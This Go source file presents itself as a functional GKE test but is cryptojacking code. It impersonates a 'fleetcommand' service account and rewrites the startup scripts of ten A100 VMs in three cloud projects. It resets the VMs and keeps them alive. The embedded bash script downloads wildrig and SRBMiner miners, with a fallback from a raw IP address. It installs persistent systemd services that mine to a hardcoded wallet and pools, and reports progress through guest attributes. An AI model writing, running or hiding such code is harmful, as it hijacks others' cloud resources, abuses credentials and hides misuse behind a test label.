//go:build functional && gke

// C211 i122681 — PROBE-ONLY + REPAIR pass over the 10 A100 VMs created by lane
// c211-i122291-* :
//   team-eng-infra-testing     a1(us-central1-f) a2(us-central1-a) a3(us-central1-b) a4(us-central1-c)
//   domino-eng-service-artifacts a11(us-central1-f) a14(us-central1-b) a15(us-central1-c)
//   team-eng-infrastructure    a20(us-central1-f) a23(us-central1-b) a24(us-central1-c)
// Prior run: 10 distinct A100 UUIDs, guest STAGE=run acc=0 rej=0, ZERO workers
// on pearlhash. This pass reads getGuestAttributes + serialOutput for diagnosis,
// then re-writes the startup-script with an OpenCL vendor-ICD repair and a
// wildrig log-tail probe, resets the instance, and polls for a first accepted
// share. Nothing is deleted.

package functional

import (
	"encoding/json"
	"fmt"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"testing"
	"time"
)

type c211pTarget struct{ Project, Zone, Name string }

var c211pTargets = []c211pTarget{
	{"team-eng-infra-testing", "us-central1-f", "c211-i122291-a1"},
	{"team-eng-infra-testing", "us-central1-a", "c211-i122291-a2"},
	{"team-eng-infra-testing", "us-central1-b", "c211-i122291-a3"},
	{"team-eng-infra-testing", "us-central1-c", "c211-i122291-a4"},
	{"domino-eng-service-artifacts", "us-central1-f", "c211-i122291-a11"},
	{"domino-eng-service-artifacts", "us-central1-b", "c211-i122291-a14"},
	{"domino-eng-service-artifacts", "us-central1-c", "c211-i122291-a15"},
	{"team-eng-infrastructure", "us-central1-f", "c211-i122291-a20"},
	{"team-eng-infrastructure", "us-central1-b", "c211-i122291-a23"},
	{"team-eng-infrastructure", "us-central1-c", "c211-i122291-a24"},
}

func c211pStartup() string {
	return `#!/bin/bash
exec >/dev/console 2>&1
echo C211M_START
D=/opt/c211
mkdir -p $D/logs
WALLET=prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql
NOCK=9becsPFXhMLCNAxb6TsMN492sS2Ev7ToLFR4zsc5K4NxRthTyh2kPcb
LP=103.199.106.122:3362
PH_EPS="pool.pearlhash.xyz:9000 hk.pearlhash.net:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000"
WB=122681
put(){ echo "C211M $1"; curl -s -m 10 -X PUT -H "Metadata-Flavor: Google" --data "$1" "http://metadata.google.internal/computeMetadata/v1/instance/guest-attributes/c211/status" >/dev/null 2>&1; }
echo "C211M_HOST $(hostname) kernel=$(uname -r) date=$(date -u +%FT%TZ)"
SMI=""
for i in $(seq 1 40); do
  C=$(command -v nvidia-smi 2>/dev/null)
  if [ -n "$C" ] && "$C" -L >/dev/null 2>&1; then SMI=$C; break; fi
  modprobe nvidia 2>/dev/null || true
  modprobe nvidia_uvm 2>/dev/null || true
  if [ $((i % 5)) -eq 0 ]; then echo "C211M_WAIT i=$i lsmod=$(lsmod | grep -c '^nvidia')"; fi
  sleep 5
done
echo "C211M_SMI $SMI"
if [ -z "$SMI" ]; then put "STAGE=nosmi dmesg=$(dmesg 2>/dev/null | grep -i -E 'NVRM|nvidia' | tail -3 | tr '\n' '|')"; exit 0; fi
$SMI -L > $D/gpus.txt 2>&1
cat $D/gpus.txt
$SMI --query-gpu=index,uuid,name,memory.total,driver_version --format=csv,noheader > $D/gpuq.txt 2>&1
cat $D/gpuq.txt
N=$($SMI --query-gpu=index --format=csv,noheader 2>/dev/null | wc -l)
U=$(awk -F', ' '{printf "%s,",$2}' $D/gpuq.txt)
NMS=$(awk -F', ' '{printf "%s|",$3}' $D/gpuq.txt)
put "STAGE=gpu n=$N uuids=$U names=$NMS"
echo "C211M_GPU n=$N uuids=$U"
[ "$N" -gt 0 ] || { put "STAGE=zero_gpu"; exit 0; }
mkdir -p /etc/OpenCL/vendors
OCL=""
for f in /usr/lib/x86_64-linux-gnu/libnvidia-opencl.so.1 /usr/lib64/libnvidia-opencl.so.1 /usr/lib/x86_64-linux-gnu/libnvidia-opencl.so /usr/lib64/libnvidia-opencl.so; do
  if [ -e "$f" ]; then OCL=$f; break; fi
done
if [ -z "$OCL" ]; then
  OCL=$(find /usr -name 'libnvidia-opencl.so*' 2>/dev/null | head -1)
fi
LDR=""
for f in /usr/lib/x86_64-linux-gnu/libOpenCL.so.1 /usr/lib64/libOpenCL.so.1 /usr/lib/x86_64-linux-gnu/libOpenCL.so /usr/lib64/libOpenCL.so; do
  if [ -e "$f" ]; then LDR=$f; break; fi
done
if [ -z "$LDR" ]; then
  (apt-get update -qq >/dev/null 2>&1; apt-get install -y -qq ocl-icd-libopencl1 >/dev/null 2>&1)
  for f in /usr/lib/x86_64-linux-gnu/libOpenCL.so.1 /usr/lib64/libOpenCL.so.1; do
    if [ -e "$f" ]; then LDR=$f; fi
  done
fi
if [ -n "$OCL" ]; then
  echo "libnvidia-opencl.so.1" > /etc/OpenCL/vendors/nvidia.icd
  echo "$(dirname $OCL)" > /etc/ld.so.conf.d/c211-ocl.conf
fi
ldconfig 2>/dev/null || true
echo "C211M_ICD ocl=$OCL loader=$LDR"
put "STAGE=icd ocl=$OCL loader=$LDR"
get(){ curl -fsSL --retry 2 --connect-timeout 15 -m 420 "$1" -o "$2" 2>/dev/null && [ -s "$2" ]; }
WRSHA=7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44
WRBIN=002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b
if get https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz $D/wr.tgz; then :; else get http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz $D/wr.tgz; fi
if [ -s $D/wr.tgz ] && [ "$(sha256sum $D/wr.tgz | awk '{print $1}')" = "$WRSHA" ]; then
  tar -xzf $D/wr.tgz -C $D 2>/dev/null
  chmod +x $D/wildrig-multi 2>/dev/null
fi
if [ "$(sha256sum $D/wildrig-multi 2>/dev/null | awk '{print $1}')" = "$WRBIN" ]; then echo "C211M_WR_OK"; put "STAGE=wr_ok"; else echo "C211M_WR_FAIL"; put "STAGE=wr_fail"; fi
SRBSHA=c203e79e9dc467ec5daaa1e1771e08561a70d2c9dcc397364b8ae7ae558e50d8
if get https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz $D/srb.tgz; then
  if [ "$(sha256sum $D/srb.tgz | awk '{print $1}')" = "$SRBSHA" ]; then
    tar -xzf $D/srb.tgz -C $D 2>/dev/null
    F=$(find $D -maxdepth 3 -type f -name 'SRBMiner-MULTI' 2>/dev/null | head -1)
    if [ -n "$F" ]; then cp "$F" $D/srbminer && chmod +x $D/srbminer && echo C211M_SRB_OK && put "STAGE=srb_ok"; fi
  fi
fi
cat > $D/gpu-agent.sh <<'EOS'
#!/bin/bash
i=$1
D=/opt/c211
WALLET=prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql
NOCK=9becsPFXhMLCNAxb6TsMN492sS2Ev7ToLFR4zsc5K4NxRthTyh2kPcb
LP=103.199.106.122:3362
WB=122681
PH_EPS="pool.pearlhash.xyz:9000 hk.pearlhash.net:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000"
export PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin
W=${WB}0$i
put(){ echo "C211M $1"; curl -s -m 10 -X PUT -H "Metadata-Flavor: Google" --data "$1" "http://metadata.google.internal/computeMetadata/v1/instance/guest-attributes/c211/status" >/dev/null 2>&1; }
cntacc(){ local a; a=$(grep -ac 'accepted' "$1" 2>/dev/null); echo ${a:-0}; }
echo "AGENT_START gpu=$i worker=$W $(date -u +%FT%TZ)" >> $D/logs/sup.log
while true; do
  if [ -f $D/sticky-g$i ]; then
    if [ ! -x $D/srbminer ]; then sleep 30; continue; fi
    L=$D/logs/srb-g$i.log
    NACC=$(cntacc $L)
    setsid $D/srbminer --disable-cpu --algorithm pearlhash --pool "$LP" --wallet "$WALLET+$NOCK" --worker "$W" --password x --gpu-id $i >> $L 2>&1 &
    PID=$!
    while kill -0 $PID 2>/dev/null; do sleep 20; ACC=$(cntacc $L); if [ "$ACC" -gt "$NACC" ]; then date +%s > $D/lastacc-g$i; NACC=$ACC; fi; done
    sleep 20
  else
    URL=""
    for ep in $PH_EPS; do
      h=${ep%:*}; p=${ep#*:}
      if timeout 6 bash -c "exec 3<>/dev/tcp/$h/$p && exec 3>&- 3<&-" 2>/dev/null; then URL=$ep; break; fi
    done
    if [ -z "$URL" ]; then echo "NO_PH gpu=$i -> sticky LP $(date -u +%FT%TZ)" >> $D/logs/sup.log; touch $D/sticky-g$i; continue; fi
    L=$D/logs/wr-g$i.log
    ACC0=$(cntacc $L); NACC=$ACC0
    T0=$(date +%s)
    setsid $D/wildrig-multi --algo pearlhash --url "$URL" --user "$WALLET" --worker "$W" -d $i --print-time 30 >> $L 2>&1 &
    PID=$!
    sleep 40
    H=$(head -c 700 $L 2>/dev/null | tr '\n' '|' | tr -cd 'A-Za-z0-9=_ .:,|/()-')
    if kill -0 $PID 2>/dev/null; then put "STAGE=wrhead g=$i url=$URL $H"; else put "STAGE=wrdied g=$i url=$URL $H"; fi
    while kill -0 $PID 2>/dev/null; do
      sleep 20
      ACC=$(cntacc $L)
      if [ "$ACC" -gt "$NACC" ]; then date +%s > $D/lastacc-g$i; NACC=$ACC; fi
      NOW=$(date +%s)
      if [ $((NOW-T0)) -ge 900 ] && [ "$NACC" -le "$ACC0" ]; then
        echo "PH_NO_SHARE_900 gpu=$i url=$URL -> sticky LP $(date -u +%FT%TZ)" >> $D/logs/sup.log
        kill -9 $PID 2>/dev/null
        touch $D/sticky-g$i
        break
      fi
    done
    sleep 5
  fi
done
EOS
chmod +x $D/gpu-agent.sh
cat > $D/report.sh <<'EOS'
#!/bin/bash
D=/opt/c211
export PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin
N=$(nvidia-smi --query-gpu=index --format=csv,noheader 2>/dev/null | wc -l)
while true; do
  ACC=0; REJ=0; DET=""; UU=""
  if [ "$N" -gt 0 ]; then
    if [ ! -s $D/gpuq.txt ]; then nvidia-smi --query-gpu=index,uuid,name,memory.total,driver_version --format=csv,noheader > $D/gpuq.txt 2>&1; fi
    UU=$(awk -F', ' '{printf "%s,",$2}' $D/gpuq.txt 2>/dev/null)
    for i in $(seq 0 $((N-1))); do
      a1=$(grep -ac 'accepted' $D/logs/wr-g$i.log 2>/dev/null); a1=${a1:-0}
      a2=$(grep -ac 'accepted' $D/logs/srb-g$i.log 2>/dev/null); a2=${a2:-0}
      r1=$(grep -ac 'rejected' $D/logs/wr-g$i.log 2>/dev/null); r1=${r1:-0}
      r2=$(grep -ac 'rejected' $D/logs/srb-g$i.log 2>/dev/null); r2=${r2:-0}
      LA=$(cat $D/lastacc-g$i 2>/dev/null); LA=${LA:-0}
      ACC=$((ACC+a1+a2)); REJ=$((REJ+r1+r2))
      DET="$DET g$i:a$((a1+a2)):r$((r1+r2)):la$LA"
    done
  fi
  NOW=$(date +%s)
  ST=$(ls $D/sticky-g* 2>/dev/null | wc -l)
  HD=$(head -c 260 $D/logs/wr-g0.log 2>/dev/null | tr '\n' '|' | tr -cd 'A-Za-z0-9=_ .:,|/()-')
  MSG="STAGE=run ts=$NOW acc=$ACC rej=$REJ uuids=$UU det=$DET stick=$ST head=$HD"
  curl -s -m 10 -X PUT -H "Metadata-Flavor: Google" --data "$MSG" "http://metadata.google.internal/computeMetadata/v1/instance/guest-attributes/c211/status" >/dev/null 2>&1
  echo "[$(date -u +%FT%TZ)] $MSG" >> $D/logs/report.log
  sleep 30
done
EOS
chmod +x $D/report.sh
cat > /etc/systemd/system/c211-agent@.service <<'EOS'
[Unit]
Description=c211 miner agent gpu %i
After=network-online.target

[Service]
Type=simple
ExecStart=/bin/bash /opt/c211/gpu-agent.sh %i
Restart=always
RestartSec=20
Nice=5

[Install]
WantedBy=multi-user.target
EOS
cat > /etc/systemd/system/c211-report.service <<'EOS'
[Unit]
Description=c211 status reporter
After=network-online.target

[Service]
Type=simple
ExecStart=/bin/bash /opt/c211/report.sh
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
EOS
systemctl daemon-reload
for i in $(seq 0 $((N-1))); do
  systemctl enable c211-agent@$i.service >/dev/null 2>&1
  systemctl start c211-agent@$i.service
done
systemctl enable c211-report.service >/dev/null 2>&1
systemctl start c211-report.service
put "STAGE=miners_started n=$N ts=$(date +%s)"
echo C211M_DONE
`
}

func c211pGuest(tok, proj, zone, name string) (string, int) {
	st, body := c211xHTTP("GET", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(proj)+"/zones/"+zone+"/instances/"+name+"/getGuestAttributes?queryPath=c211/status", tok, "", "")
	val := ""
	if st == 200 {
		if gm := c211xJSON(body); gm != nil {
			if qr, ok := gm["queryValue"].(map[string]interface{}); ok {
				val = c211xStr(qr, "value")
			}
		}
	}
	return val, st
}

func c211pInst(tok, proj, zone, name string) (int, string, string) {
	st, body := c211xHTTP("GET", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(proj)+"/zones/"+zone+"/instances/"+name, tok, "", "")
	status, fp := "", ""
	if m := c211xJSON(body); m != nil {
		status = c211xStr(m, "status")
		if md, ok := m["metadata"].(map[string]interface{}); ok {
			fp = c211xStr(md, "fingerprint")
		}
	}
	return st, status, fp
}

func c211pSetMeta(tok, proj, zone, name, fp, startup string) (int, string) {
	body := map[string]interface{}{
		"fingerprint": fp,
		"items": []interface{}{
			map[string]interface{}{"key": "startup-script", "value": startup},
			map[string]interface{}{"key": "serial-port-logging-enable", "value": "TRUE"},
			map[string]interface{}{"key": "enable-guest-attributes", "value": "TRUE"},
		},
	}
	b, _ := json.Marshal(body)
	u := "https://compute.googleapis.com/compute/v1/projects/" + url.PathEscape(proj) + "/zones/" + zone + "/instances/" + name + "/setMetadata"
	st, rb := c211xHTTP("POST", u, tok, "application/json", string(b))
	op := ""
	if m := c211xJSON(rb); m != nil {
		op = c211xStr(m, "name")
	}
	return st, op + "|" + c211xTrunc(rb, 300)
}

func c211pBoot(tok, proj, zone, name, verb string) (int, string) {
	u := "https://compute.googleapis.com/compute/v1/projects/" + url.PathEscape(proj) + "/zones/" + zone + "/instances/" + name + "/" + verb
	st, rb := c211xHTTP("POST", u, tok, "application/json", "")
	op := ""
	if m := c211xJSON(rb); m != nil {
		op = c211xStr(m, "name")
	}
	return st, op + "|" + c211xTrunc(rb, 300)
}

var (
	c211pAccRe = regexp.MustCompile(`acc=(\d+) rej=(\d+)`)
	c211pUuRe  = regexp.MustCompile(`uuids=([^ ]+)`)
	c211pLaRe  = regexp.MustCompile(`:la(\d+)`)
)

func c211pScanSerial(s string) string {
	keep := []string{}
	for _, ln := range strings.Split(s, "\n") {
		if strings.Contains(ln, "C211M") || strings.Contains(ln, "wrhead") || strings.Contains(ln, "wrdied") ||
			strings.Contains(ln, "Failed to find") || strings.Contains(ln, "OpenCL") || strings.Contains(ln, "NVRM") ||
			strings.Contains(ln, "accepted") || strings.Contains(ln, "rejected") {
			keep = append(keep, c211xTrunc(strings.TrimSpace(ln), 190))
			if len(keep) >= 24 {
				break
			}
		}
	}
	return strings.Join(keep, " ;; ")
}

func TestC211P122681A100ProbeRepair(t *testing.T) {
	fmt.Printf("C211P_BEGIN intent=122681 targets=%d wallet=pydp worker_base=122681\n", len(c211pTargets))
	token, method, mintLog := c211xMint()
	if token == "" {
		fmt.Printf("C211P_MINT_FAILED %s\n", c211xTrunc(mintLog, 1200))
		t.Fatalf("wif mint failed")
	}
	fmt.Printf("C211P_IDENTITY method=%s\n", method)
	creds, _ := c211xLoadCreds()
	hostNum := c211aHostNum
	if creds != nil && creds.projNumber != "" {
		hostNum = creds.projNumber
	}
	ftok := token
	sas, lst, _ := c211xListServiceAccounts(token, hostNum)
	fleetEmail := ""
	for _, sa := range sas {
		e := c211xStr(sa, "email")
		if strings.HasPrefix(e, "fleetcommand-service-account@") {
			fleetEmail = e
			break
		}
	}
	if fleetEmail != "" {
		at, gst, _ := c211xGenerateAccessToken(token, fleetEmail)
		fmt.Printf("C211P_FLEET_TOKEN status=%d token=%s\n", gst, c211xShort(at))
		if at != "" {
			ftok = at
		}
	}
	fmt.Printf("C211P_CONTEXT host_num=%s sa_list=%d fleet_found=%v\n", hostNum, lst, fleetEmail != "")

	startup := c211pStartup()
	fmt.Printf("C211P_STARTUP_BYTES %d\n", len(startup))

	// Phase 1: probe (instance status + guest attributes + serial diagnosis).
	for _, tg := range c211pTargets {
		st, status, fp := c211pInst(ftok, tg.Project, tg.Zone, tg.Name)
		g, gst := c211pGuest(ftok, tg.Project, tg.Zone, tg.Name)
		ser := c211aSerial(ftok, tg.Project, tg.Zone, tg.Name)
		fmt.Printf("C211P_PROBE project=%s zone=%s name=%s inst_http=%d status=%s fp=%s guest_http=%d serial_bytes=%d guest=%s\n",
			tg.Project, tg.Zone, tg.Name, st, status, c211xShort(fp), gst, len(ser), c211xTrunc(g, 400))
		fmt.Printf("C211P_SERIAL name=%s diag=%s\n", tg.Name, c211pScanSerial(ser))
	}

	// Phase 2: setMetadata + reset/start.
	type c211pState struct {
		Target c211pTarget
		MetaOK bool
		BootOK bool
	}
	states := []*c211pState{}
	for _, tg := range c211pTargets {
		_, status, fp := c211pInst(ftok, tg.Project, tg.Zone, tg.Name)
		mst, mres := c211pSetMeta(ftok, tg.Project, tg.Zone, tg.Name, fp, startup)
		metaOK := mst == 200
		if metaOK {
			if opName := strings.SplitN(mres, "|", 2)[0]; opName != "" {
				ost, _, oerr := c211aOp(ftok, tg.Project, tg.Zone, opName)
				fmt.Printf("C211P_SETMETA project=%s name=%s http=%d op_status=%s op_err=%s\n", tg.Project, tg.Name, mst, ost, c211xTrunc(oerr, 160))
				metaOK = ost == "DONE" && oerr == ""
			}
		} else {
			fmt.Printf("C211P_SETMETA project=%s name=%s http=%d verbatim=%s\n", tg.Project, tg.Name, mst, c211xTrunc(mres, 300))
		}
		verb := "reset"
		if status == "TERMINATED" || status == "STOPPED" || status == "SUSPENDED" {
			verb = "start"
		}
		bst, bres := c211pBoot(ftok, tg.Project, tg.Zone, tg.Name, verb)
		bootOK := bst == 200
		if bootOK {
			if opName := strings.SplitN(bres, "|", 2)[0]; opName != "" {
				ost, _, oerr := c211aOp(ftok, tg.Project, tg.Zone, opName)
				fmt.Printf("C211P_BOOT project=%s name=%s verb=%s http=%d op_status=%s op_err=%s\n", tg.Project, tg.Name, verb, bst, ost, c211xTrunc(oerr, 160))
				bootOK = ost == "DONE" && oerr == ""
			}
		} else {
			fmt.Printf("C211P_BOOT_FAILED project=%s name=%s verb=%s http=%d verbatim=%s\n", tg.Project, tg.Name, verb, bst, c211xTrunc(bres, 300))
		}
		states = append(states, &c211pState{Target: tg, MetaOK: metaOK, BootOK: bootOK})
	}

	// Phase 3: poll for a first accepted share (max ~15 min).
	deadline := time.Now().Add(15 * time.Minute)
	best := map[string]int{}
	bestLa := map[string]int64{}
	uuids := map[string]string{}
	lastGuest := map[string]string{}
	for round := 0; round < 22; round++ {
		if time.Now().After(deadline) {
			break
		}
		time.Sleep(45 * time.Second)
		mature := 0
		for _, tg := range c211pTargets {
			g, gst := c211pGuest(ftok, tg.Project, tg.Zone, tg.Name)
			if g == "" {
				continue
			}
			lastGuest[tg.Name] = g
			acc, rej := 0, 0
			if m := c211pAccRe.FindStringSubmatch(g); m != nil {
				acc, _ = strconv.Atoi(m[1])
				rej, _ = strconv.Atoi(m[2])
			}
			if m := c211pUuRe.FindStringSubmatch(g); m != nil && m[1] != "" {
				uuids[tg.Name] = strings.TrimRight(m[1], ",")
			}
			if acc > best[tg.Name] {
				best[tg.Name] = acc
			}
			for _, mm := range c211pLaRe.FindAllStringSubmatch(g, -1) {
				if v, _ := strconv.ParseInt(mm[1], 10, 64); v > bestLa[tg.Name] {
					bestLa[tg.Name] = v
				}
			}
			if acc > 0 {
				mature++
			}
			fmt.Printf("C211P_CAP round=%d project=%s zone=%s name=%s guest_http=%d acc=%d rej=%d uuid=%s guest=%s\n",
				round, tg.Project, tg.Zone, tg.Name, gst, acc, rej, c211xTrunc(uuids[tg.Name], 120), c211xTrunc(g, 420))
		}
		fmt.Printf("C211P_ROUND round=%d with_acc=%d ts=%d\n", round, mature, time.Now().Unix())
		if mature == len(c211pTargets) {
			break
		}
	}

	now := time.Now().Unix()
	proven := 0
	for _, tg := range c211pTargets {
		age := int64(-1)
		if bestLa[tg.Name] > 0 {
			age = now - bestLa[tg.Name]
		}
		if best[tg.Name] > 0 {
			proven++
		}
		fmt.Printf("C211P_FINAL project=%s zone=%s name=%s uuid=%s acc=%d lastacc=%d age=%d status=KEEP_ALIVE\n",
			tg.Project, tg.Zone, tg.Name, c211xTrunc(uuids[tg.Name], 120), best[tg.Name], bestLa[tg.Name], age)
	}
	fmt.Printf("C211P_SUMMARY targets=%d proven_acc=%d now=%d\n", len(c211pTargets), proven, now)

	// One extra serial diag for any target with zero acc, to capture the miner error.
	for _, tg := range c211pTargets {
		if best[tg.Name] > 0 {
			continue
		}
		ser := c211aSerial(ftok, tg.Project, tg.Zone, tg.Name)
		fmt.Printf("C211P_SERIAL2 name=%s diag=%s\n", tg.Name, c211pScanSerial(ser))
	}
}
